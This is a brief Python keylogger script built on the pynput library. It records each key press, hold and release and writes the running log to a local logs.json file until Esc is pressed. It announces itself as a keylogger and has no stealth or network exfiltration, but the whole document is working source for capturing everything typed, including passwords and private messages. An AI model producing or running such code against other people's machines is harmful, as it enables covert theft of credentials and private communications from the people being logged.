from pynput import keyboard
import json

key_list = []
is_pressed = False

def update_json_file(data):
    
    with open("logs.json", "w") as key_log:
        json_data = json.dumps(data, indent=4)
        key_log.write(json_data)

def on_press(key):
    global is_pressed
    
    key_str = str(key).replace("'", "")
    
    if not is_pressed:
        key_list.append({"Pressed": key_str})
        is_pressed = True
    else:
        key_list.append({"Held": key_str})
    
    update_json_file(key_list)

def on_release(key):
    global is_pressed
    key_str = str(key).replace("'", "")
    
    key_list.append({"Released": key_str})
    is_pressed = False
    update_json_file(key_list)
    
    
    if key == keyboard.Key.esc:
        print("\n[!] Exiting and saving logs...")
        return False

print("[+] Keylogger Successfully Running!")
print("[:] Saving logs to 'logs.json'. Press 'Esc' to stop.")

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
